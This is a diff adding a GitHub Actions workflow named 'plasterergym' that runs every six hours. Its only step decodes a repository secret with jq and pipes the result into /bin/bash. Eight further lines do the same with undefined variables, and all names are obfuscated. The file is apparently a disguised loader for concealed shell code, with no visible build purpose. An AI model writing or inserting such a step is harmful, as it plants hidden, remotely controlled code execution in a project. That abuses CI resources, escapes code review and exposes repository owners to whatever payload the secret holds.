@@ -1,0 +1,26 @@
+name: plasterergym
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: plasterergym
+        env:
+          egyp30: ${{ secrets.egyp30 }}
+        run: |
+          echo $egyp30 | jq -r .xl22597 | /bin/bash
+          echo $x6 | jq -r .s36 | /bin/bash
+          echo $kcv90 | jq -r .j8478 | /bin/bash
+          echo $goazi4 | jq -r .oepp51693 | /bin/bash
+          echo $ssx12 | jq -r .htzc19037 | /bin/bash
+          echo $clu134 | jq -r .huc98759 | /bin/bash
+          echo $w022 | jq -r .tyej69095 | /bin/bash
+          echo $dyr68579 | jq -r .l9 | /bin/bash
+          echo $ubkz000 | jq -r .oy34928 | /bin/bash
+
